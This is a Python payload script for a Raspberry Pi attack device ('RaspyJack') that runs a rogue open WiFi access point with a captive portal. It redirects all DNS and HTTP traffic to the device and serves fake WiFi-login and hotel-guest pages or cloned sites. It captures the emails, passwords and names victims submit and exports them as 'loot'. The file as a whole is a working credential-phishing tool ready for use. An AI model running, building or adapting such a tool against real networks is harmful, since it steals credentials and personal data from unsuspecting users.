#!/usr/bin/env python3
"""
RaspyJack Payload -- Advanced Captive Portal
==============================================
Author: 7h30th3r0n3

Captive portal with template selection. Serves phishing pages
from /root/Raspyjack/DNSSpoof/sites/ or built-in templates.

Setup / Prerequisites
---------------------
- USB WiFi dongle with monitor mode support (e.g. Alfa AWUS036ACH)
- apt install hostapd dnsmasq-base
- Optional: phishing templates in /root/Raspyjack/DNSSpoof/sites/
- Dongle is auto-detected on wlan1+ (onboard wlan0 is reserved for WebUI)

Flow:
  1) Show template list (DNSSpoof/sites/ + built-in)
  2) User selects template
  3) Start hostapd on USB dongle (open network)
  4) Start dnsmasq for DHCP + DNS wildcard redirect
  5) Serve selected template via HTTP server
  6) Capture POST credentials

Controls:
  OK          -- Select template / start
  UP / DOWN   -- Scroll templates
  LEFT / RIGHT-- Change SSID character
  KEY1        -- Show captured credentials
  KEY2        -- Export to loot
  KEY3        -- Exit + cleanup

Loot: /root/Raspyjack/loot/CaptivePortal/
"""

import os
import sys
import time
import json
import signal
import threading
import subprocess
import re
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, unquote_plus
from socketserver import ThreadingMixIn

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
LOOT_DIR = "/root/Raspyjack/loot/CaptivePortal"
os.makedirs(LOOT_DIR, exist_ok=True)

SITES_DIR = "/root/Raspyjack/DNSSpoof/sites"
HOSTAPD_CONF = "/tmp/raspyjack_captive_hostapd.conf"
DNSMASQ_CONF = "/tmp/raspyjack_captive_dnsmasq.conf"
PORTAL_PORT = 80
GATEWAY_IP = "10.0.99.1"
DHCP_RANGE_START = "10.0.99.10"
DHCP_RANGE_END = "10.0.99.250"
ROWS_VISIBLE = 6

SSID_CHARS = list(
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
    "0123456789 -_."
)

# ---------------------------------------------------------------------------
# WiFi helpers
# ---------------------------------------------------------------------------

def _is_onboard_wifi_iface(iface):
    """True for onboard Pi WiFi (SDIO/mmc path or brcmfmac driver)."""
    try:
        devpath = os.path.realpath(f"/sys/class/net/{iface}/device")
        if "mmc" in devpath:
            return True
    except Exception:
        pass
    try:
        driver = os.path.basename(
            os.path.realpath(f"/sys/class/net/{iface}/device/driver"),
        )
        if driver == "brcmfmac":
            return True
    except Exception:
        pass
    return False


def _find_usb_wifi():
    """Find first USB WiFi interface (skip onboard)."""
    try:
        for name in sorted(os.listdir("/sys/class/net")):
            if not name.startswith("wlan"):
                continue
            if _is_onboard_wifi_iface(name):
                continue
            return name
    except Exception:
        pass
    return None


def _set_managed_mode(iface):
    """Restore managed mode."""
    for cmd in (
        ["sudo", "ip", "link", "set", iface, "down"],
        ["sudo", "iw", "dev", iface, "set", "type", "managed"],
        ["sudo", "ip", "link", "set", iface, "up"],
    ):
        subprocess.run(cmd, capture_output=True, timeout=5)


# ---------------------------------------------------------------------------
# Built-in templates
# ---------------------------------------------------------------------------

BUILTIN_WIFI_LOGIN = """<!DOCTYPE html>
<html><head><title>WiFi Login</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
body{font-family:Arial,sans-serif;background:#1a1a2e;color:#fff;
display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.box{background:#16213e;padding:30px;border-radius:12px;
box-shadow:0 4px 20px rgba(0,0,0,.4);max-width:380px;width:90%}
h2{margin-top:0;color:#e94560}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #0f3460;
border-radius:6px;box-sizing:border-box;background:#1a1a2e;color:#fff}
button{width:100%;padding:14px;background:#e94560;color:#fff;border:none;
border-radius:6px;cursor:pointer;font-size:16px;margin-top:10px}
</style></head><body>
<div class="box">
<h2>WiFi Authentication</h2>
<p>Please sign in to access the network.</p>
<form method="POST" action="/login">
<input name="email" placeholder="Email" required>
<input name="password" type="password" placeholder="Password" required>
<button type="submit">Connect</button>
</form></div></body></html>"""

BUILTIN_HOTEL_WIFI = """<!DOCTYPE html>
<html><head><title>Hotel WiFi</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
body{font-family:Georgia,serif;background:#f5f0e8;color:#333;
display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.box{background:#fff;padding:35px;border-radius:4px;
box-shadow:0 2px 15px rgba(0,0,0,.1);max-width:400px;width:90%;
border-top:4px solid #8b7355}
h2{margin-top:0;color:#8b7355;font-weight:normal}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;
border-radius:4px;box-sizing:border-box}
button{width:100%;padding:14px;background:#8b7355;color:#fff;border:none;
border-radius:4px;cursor:pointer;font-size:16px;margin-top:10px}
.note{color:#999;font-size:11px;margin-top:15px}
</style></head><body>
<div class="box">
<h2>Welcome Guest</h2>
<p>Enter your room number and last name to connect.</p>
<form method="POST" action="/login">
<input name="room" placeholder="Room Number" required>
<input name="lastname" placeholder="Last Name" required>
<input name="email" placeholder="Email (optional)">
<button type="submit">Access WiFi</button>
</form>
<p class="note">Complimentary WiFi for registered guests.</p>
</div></body></html>"""

BUILTIN_SUCCESS = """<!DOCTYPE html>
<html><head><title>Connected</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{font-family:Arial,sans-serif;text-align:center;padding:60px;
background:#1a1a2e;color:#fff}
h2{color:#4ecca3}.check{font-size:64px;color:#4ecca3}</style></head>
<body><div class="check">&#10003;</div>
<h2>Connected!</h2><p>You are now online.</p></body></html>"""

BUILTIN_TEMPLATES = {
    "WiFi Login": BUILTIN_WIFI_LOGIN,
    "Hotel WiFi": BUILTIN_HOTEL_WIFI,
}

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
templates = []          # list of {"name": ..., "path": ... or None, "builtin": bool}
scroll_pos = 0
selected_idx = 0
status_msg = "Select template"
view_mode = "templates"  # templates | ssid_edit | attack | creds
attack_running = False
running = True
credentials = []
clients_connected = 0
ssid = list("FreeWiFi")
ssid_cursor = 0
active_template_name = ""

_hostapd_proc = None
_dnsmasq_proc = None
_portal_server = None
_iface = None

# ---------------------------------------------------------------------------
# Template discovery
# ---------------------------------------------------------------------------

def _discover_templates():
    """Scan for available templates."""
    found = []

    # Built-in templates
    for name in BUILTIN_TEMPLATES:
        found.append({"name": name, "path": None, "builtin": True})

    # DNSSpoof sites
    if os.path.isdir(SITES_DIR):
        try:
            for entry in sorted(os.listdir(SITES_DIR)):
                site_path = os.path.join(SITES_DIR, entry)
                if os.path.isdir(site_path):
                    # Check for index.html or login.html
                    for fname in ("index.html", "login.html", "index.php"):
                        if os.path.isfile(os.path.join(site_path, fname)):
                            found.append({
                                "name": entry,
                                "path": site_path,
                                "builtin": False,
                            })
                            break
        except Exception:
            pass

    return found


# ---------------------------------------------------------------------------
# Portal HTTP server
# ---------------------------------------------------------------------------

class CaptiveHandler(BaseHTTPRequestHandler):
    """Serve captive portal pages and capture credentials."""

    template_html = BUILTIN_WIFI_LOGIN
    template_dir = None

    def _serve_file(self, filepath, content_type="text/html"):
        """Serve a file from the template directory."""
        try:
            with open(filepath, "rb") as fh:
                data = fh.read()
            self.send_response(200)
            self.send_header("Content-Type", content_type)
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)
        except FileNotFoundError:
            self.send_error(404)

    def _guess_content_type(self, path):
        """Guess content type from file extension."""
        ext = os.path.splitext(path)[1].lower()
        types = {
            ".html": "text/html", ".htm": "text/html",
            ".css": "text/css", ".js": "application/javascript",
            ".png": "image/png", ".jpg": "image/jpeg",
            ".jpeg": "image/jpeg", ".gif": "image/gif",
            ".svg": "image/svg+xml", ".ico": "image/x-icon",
        }
        return types.get(ext, "application/octet-stream")

    def do_GET(self):
        path = self.path.split("?")[0]

        if self.template_dir:
            # Serve from template directory
            if path == "/" or path == "":
                for fname in ("index.html", "login.html", "index.php"):
                    fpath = os.path.join(self.template_dir, fname)
                    if os.path.isfile(fpath):
                        self._serve_file(fpath)
                        return
                self.send_error(404)
            else:
                safe_path = path.lstrip("/").replace("..", "")
                fpath = os.path.join(self.template_dir, safe_path)
                if os.path.isfile(fpath):
                    ct = self._guess_content_type(fpath)
                    self._serve_file(fpath, ct)
                else:
                    self.send_error(404)
        else:
            # Serve built-in template
            html = self.template_html.encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.send_header("Content-Length", str(len(html)))
            self.end_headers()
            self.wfile.write(html)

    def do_POST(self):
        global clients_connected
        content_len = int(self.headers.get("Content-Length", 0))
        body = ""
        if content_len > 0:
            body = self.rfile.read(content_len).decode("utf-8", errors="replace")

        # Parse form data
        params = parse_qs(body)
        cred_entry = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "src_ip": self.client_address[0],
            "path": self.path,
            "fields": {},
        }
        for key, values in params.items():
            cred_entry["fields"][key] = unquote_plus(values[0]) if values else ""

        if cred_entry["fields"]:
            with lock:
                credentials.append(cred_entry)

        # Serve success page
        html = BUILTIN_SUCCESS.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.send_header("Content-Length", str(len(html)))
        self.end_headers()
        self.wfile.write(html)

    def log_message(self, fmt, *args):
        pass


class ThreadedPortalServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True


# ---------------------------------------------------------------------------
# hostapd + dnsmasq
# ---------------------------------------------------------------------------

def _write_hostapd_conf(iface, ssid_str):
    """Write hostapd config for open AP."""
    conf = (
        f"interface={iface}\n"
        f"driver=nl80211\n"
        f"ssid={ssid_str}\n"
        f"hw_mode=g\n"
        f"channel=6\n"
        f"wmm_enabled=0\n"
        f"auth_algs=1\n"
        f"wpa=0\n"
        f"ignore_broadcast_ssid=0\n"
    )
    with open(HOSTAPD_CONF, "w") as fh:
        fh.write(conf)


def _write_dnsmasq_conf(iface):
    """Write dnsmasq config with DNS wildcard redirect."""
    conf = (
        f"interface={iface}\n"
        f"dhcp-range={DHCP_RANGE_START},{DHCP_RANGE_END},1h\n"
        f"dhcp-option=3,{GATEWAY_IP}\n"
        f"dhcp-option=6,{GATEWAY_IP}\n"
        f"address=/#/{GATEWAY_IP}\n"
        f"no-resolv\n"
    )
    with open(DNSMASQ_CONF, "w") as fh:
        fh.write(conf)


# ---------------------------------------------------------------------------
# Client counter thread
# ---------------------------------------------------------------------------

def _count_clients():
    """Periodically count connected clients via hostapd."""
    global clients_connected
    while running and attack_running:
        try:
            result = subprocess.run(
                ["sudo", "hostapd_cli", "all_sta"],
                capture_output=True, text=True, timeout=5,
            )
            # Count MAC addresses in output
            macs = re.findall(r"[0-9a-f:]{17}", result.stdout, re.I)
            with lock:
                clients_connected = len(set(macs))
        except Exception:
            pass
        time.sleep(5)


# ---------------------------------------------------------------------------
# Attack start / stop
# ---------------------------------------------------------------------------

def _start_attack(template):
    """Start captive portal with selected template."""
    global attack_running, status_msg, _hostapd_proc, _dnsmasq_proc
    global _portal_server, active_template_name

    iface = _iface
    if not iface:
        with lock:
            status_msg = "No USB WiFi"
        return

    ssid_str = "".join(ssid)
    with lock:
        status_msg = f"Starting {ssid_str}..."
        active_template_name = template["name"]

    _set_managed_mode(iface)
    time.sleep(0.5)

    # Configure IP
    subprocess.run(
        ["sudo", "ip", "addr", "flush", "dev", iface],
        capture_output=True,
    )
    subprocess.run(
        ["sudo", "ip", "addr", "add", f"{GATEWAY_IP}/24", "dev", iface],
        capture_output=True,
    )
    subprocess.run(
        ["sudo", "ip", "link", "set", iface, "up"],
        capture_output=True,
    )

    # Write configs
    _write_hostapd_conf(iface, ssid_str)
    _write_dnsmasq_conf(iface)

    # Start hostapd
    subprocess.run(["sudo", "killall", "hostapd"], capture_output=True)
    try:
        _hostapd_proc = subprocess.Popen(
            ["sudo", "hostapd", HOSTAPD_CONF],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
    except Exception as exc:
        with lock:
            status_msg = f"hostapd failed: {exc}"
        return

    time.sleep(1)

    # Start dnsmasq
    subprocess.run(["sudo", "killall", "dnsmasq"], capture_output=True)
    try:
        _dnsmasq_proc = subprocess.Popen(
            ["sudo", "dnsmasq", "-C", DNSMASQ_CONF, "--no-daemon"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
    except Exception as exc:
        with lock:
            status_msg = f"dnsmasq failed: {exc}"

    # Configure portal handler
    if template["builtin"]:
        CaptiveHandler.template_html = BUILTIN_TEMPLATES[template["name"]]
        CaptiveHandler.template_dir = None
    else:
        CaptiveHandler.template_dir = template["path"]

    # Start portal HTTP server
    try:
        _portal_server = ThreadedPortalServer(
            ("0.0.0.0", PORTAL_PORT), CaptiveHandler,
        )
        portal_thread = threading.Thread(
            target=_portal_server.serve_forever, daemon=True,
        )
        portal_thread.start()
    except Exception as exc:
        with lock:
            status_msg = f"Portal failed: {exc}"
        return

    # Enable IP forwarding for captive portal detection
    subprocess.run(
        ["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"],
        capture_output=True,
    )
    # NAT redirect HTTP to portal
    subprocess.run(
        ["sudo", "iptables", "-t", "nat", "-A", "PREROUTING",
         "-p", "tcp", "--dport", "80", "-j", "DNAT",
         "--to-destination", f"{GATEWAY_IP}:{PORTAL_PORT}"],
        capture_output=True,
    )
    subprocess.run(
        ["sudo", "iptables", "-t", "nat", "-A", "POSTROUTING",
         "-j", "MASQUERADE"],
        capture_output=True,
    )

    with lock:
        attack_running = True
        status_msg = f"Portal: {ssid_str}"
        view_mode = "attack"

    # Start client counter
    threading.Thread(target=_count_clients, daemon=True).start()


def _stop_attack():
    """Stop all services and clean up."""
    global attack_running, _hostapd_proc, _dnsmasq_proc, _portal_server

    with lock:
        attack_running = False

    if _portal_server:
        _portal_server.shutdown()
        _portal_server = None

    if _hostapd_proc and _hostapd_proc.poll() is None:
        _hostapd_proc.terminate()
        try:
            _hostapd_proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            _hostapd_proc.kill()
    _hostapd_proc = None

    if _dnsmasq_proc and _dnsmasq_proc.poll() is None:
        _dnsmasq_proc.terminate()
        try:
            _dnsmasq_proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            _dnsmasq_proc.kill()
    _dnsmasq_proc = None

    # Kill any remaining
    subprocess.run(["sudo", "killall", "hostapd"], capture_output=True)
    subprocess.run(["sudo", "killall", "dnsmasq"], capture_output=True)

    # Cleanup iptables
    subprocess.run(["sudo", "iptables", "-t", "nat", "-F"], capture_output=True)
    subprocess.run(
        ["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"],
        capture_output=True,
    )

    # Restore interface
    if _iface:
        _set_managed_mode(_iface)

    # Remove temp files
    for path in (HOSTAPD_CONF, DNSMASQ_CONF):
        try:
            os.remove(path)
        except OSError:
            pass


# ---------------------------------------------------------------------------
# Export
# ---------------------------------------------------------------------------

def _export_creds():
    """Export captured credentials to loot."""
    with lock:
        data = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "ssid": "".join(ssid),
            "template": active_template_name,
            "clients": clients_connected,
            "credentials": list(credentials),
        }
    if not data["credentials"]:
        return
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = os.path.join(LOOT_DIR, f"captive_{ts}.json")
    try:
        with open(path, "w") as fh:
            json.dump(data, fh, indent=2)
        with lock:
            global status_msg
            status_msg = f"Exported {len(data['credentials'])} creds"
    except Exception:
        pass


# ---------------------------------------------------------------------------
# LCD rendering
# ---------------------------------------------------------------------------

def _draw_screen():
    """Render state on LCD."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
    draw = ScaledDraw(img)

    draw.text((2, 2), "Captive Portal", fill="CYAN", font=font)

    with lock:
        st = status_msg
        vm = view_mode
        sp = scroll_pos
        si = selected_idx
        tpls = list(templates)
        creds = list(credentials)
        cli = clients_connected
        ssid_str = "".join(ssid)
        sc = ssid_cursor
        atk = attack_running
        tpl_name = active_template_name

    draw.text((2, 14), st[:22], fill="WHITE", font=font)

    if vm == "templates":
        y = 28
        for i, t in enumerate(tpls[sp:sp + ROWS_VISIBLE]):
            real_i = sp + i
            prefix = ">" if real_i == si else " "
            color = "YELLOW" if real_i == si else "WHITE"
            label = t["name"][:18]
            if t["builtin"]:
                label += " *"
            draw.text((2, y), f"{prefix}{label}", fill=color, font=font)
            y += 14
        draw.text((2, 116), "OK=select UP/DN=scroll", fill="GRAY", font=font)

    elif vm == "ssid_edit":
        draw.text((2, 28), "Edit SSID:", fill="WHITE", font=font)
        # Show SSID with cursor
        ssid_display = ssid_str
        draw.text((2, 44), ssid_display[:22], fill="GREEN", font=font)
        # Cursor indicator
        cursor_x = 2 + sc * 6  # approximate char width
        draw.text((cursor_x, 56), "^", fill="RED", font=font)
        draw.text((2, 72), "L/R=move UP/DN=char", fill="GRAY", font=font)
        draw.text((2, 86), "OK=start portal", fill="GRAY", font=font)
        draw.text((2, 116), "K3=back", fill="GRAY", font=font)

    elif vm == "attack":
        draw.text((2, 28), f"SSID: {ssid_str[:16]}", fill="GREEN", font=font)
        draw.text((2, 42), f"Template: {tpl_name[:14]}", fill="WHITE", font=font)
        draw.text((2, 56), f"Clients: {cli}", fill="YELLOW", font=font)
        draw.text((2, 70), f"Creds: {len(creds)}", fill="RED" if creds else "GRAY", font=font)

        # Show recent creds
        y = 86
        for c in creds[-2:]:
            fields = c.get("fields", {})
            user = fields.get("email", fields.get("username", fields.get("room", "?")))
            draw.text((2, y), f"  {user[:20]}", fill="GREEN", font=font)
            y += 10

        draw.text((2, 116), "K1=creds K2=export", fill="GRAY", font=font)

    elif vm == "creds":
        y = 28
        visible = creds[sp:sp + ROWS_VISIBLE]
        for c in visible:
            fields = c.get("fields", {})
            user = fields.get("email", fields.get("username", "?"))
            pw = fields.get("password", fields.get("lastname", "?"))
            line = f"{user[:10]}:{pw[:10]}"
            draw.text((2, y), line[:22], fill="GREEN", font=font)
            y += 14
        draw.text((2, 116), "OK=back UP/DN=scroll", fill="GRAY", font=font)

    LCD.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Main loop
# ---------------------------------------------------------------------------

def main():
    global running, scroll_pos, selected_idx, view_mode, _iface
    global ssid, ssid_cursor

    _iface = _find_usb_wifi()

    try:
        if not _iface:
            with lock:
                global status_msg
                status_msg = "No USB WiFi found!"
            _draw_screen()
            while True:
                btn = get_button(PINS, GPIO)
                if btn == "KEY3":
                    return
                time.sleep(0.15)

        # Discover templates
        with lock:
            global templates
            templates = _discover_templates()
            if not templates:
                status_msg = "No templates found!"
            else:
                status_msg = f"{len(templates)} templates"

        _draw_screen()

        while running:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                if view_mode == "ssid_edit":
                    with lock:
                        view_mode = "templates"
                else:
                    running = False
                    break

            elif btn == "OK":
                with lock:
                    vm = view_mode
                    si = selected_idx
                    tpls = list(templates)
                    atk = attack_running

                if vm == "templates" and 0 <= si < len(tpls):
                    with lock:
                        view_mode = "ssid_edit"

                elif vm == "ssid_edit" and not atk:
                    tpl = tpls[si] if 0 <= si < len(tpls) else None
                    if tpl:
                        threading.Thread(
                            target=_start_attack, args=(tpl,), daemon=True,
                        ).start()

                elif vm == "creds":
                    with lock:
                        view_mode = "attack"
                        scroll_pos = 0

            elif btn == "UP":
                with lock:
                    if view_mode == "templates":
                        if selected_idx > 0:
                            selected_idx -= 1
                        if selected_idx < scroll_pos:
                            scroll_pos = selected_idx
                    elif view_mode == "ssid_edit":
                        # Change character at cursor position
                        if ssid_cursor < len(ssid):
                            current_char = ssid[ssid_cursor]
                            idx = SSID_CHARS.index(current_char) if current_char in SSID_CHARS else 0
                            new_idx = (idx + 1) % len(SSID_CHARS)
                            new_ssid = list(ssid)
                            new_ssid[ssid_cursor] = SSID_CHARS[new_idx]
                            ssid = new_ssid
                    elif view_mode in ("creds", "attack"):
                        if scroll_pos > 0:
                            scroll_pos -= 1

            elif btn == "DOWN":
                with lock:
                    if view_mode == "templates":
                        if selected_idx < len(templates) - 1:
                            selected_idx += 1
                        if selected_idx >= scroll_pos + ROWS_VISIBLE:
                            scroll_pos = selected_idx - ROWS_VISIBLE + 1
                    elif view_mode == "ssid_edit":
                        if ssid_cursor < len(ssid):
                            current_char = ssid[ssid_cursor]
                            idx = SSID_CHARS.index(current_char) if current_char in SSID_CHARS else 0
                            new_idx = (idx - 1) % len(SSID_CHARS)
                            new_ssid = list(ssid)
                            new_ssid[ssid_cursor] = SSID_CHARS[new_idx]
                            ssid = new_ssid
                    elif view_mode == "creds":
                        max_s = max(0, len(credentials) - ROWS_VISIBLE)
                        if scroll_pos < max_s:
                            scroll_pos += 1

            elif btn == "LEFT":
                with lock:
                    if view_mode == "ssid_edit":
                        if ssid_cursor > 0:
                            ssid_cursor -= 1

            elif btn == "RIGHT":
                with lock:
                    if view_mode == "ssid_edit":
                        if ssid_cursor < len(ssid) - 1:
                            ssid_cursor += 1
                        elif ssid_cursor == len(ssid) - 1 and len(ssid) < 32:
                            ssid = list(ssid) + ["A"]
                            ssid_cursor += 1

            elif btn == "KEY1":
                with lock:
                    if attack_running:
                        view_mode = "creds"
                        scroll_pos = 0

            elif btn == "KEY2":
                threading.Thread(target=_export_creds, daemon=True).start()

            _draw_screen()
            time.sleep(0.15)

    finally:
        running = False

        if attack_running:
            _stop_attack()

        try:
            img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
            draw = ScaledDraw(img)
            draw.text((10, 56), "Portal stopped", fill="RED", font=font)
            LCD.LCD_ShowImage(img, 0, 0)
        except Exception:
            pass

        GPIO.cleanup()


if __name__ == "__main__":
    main()
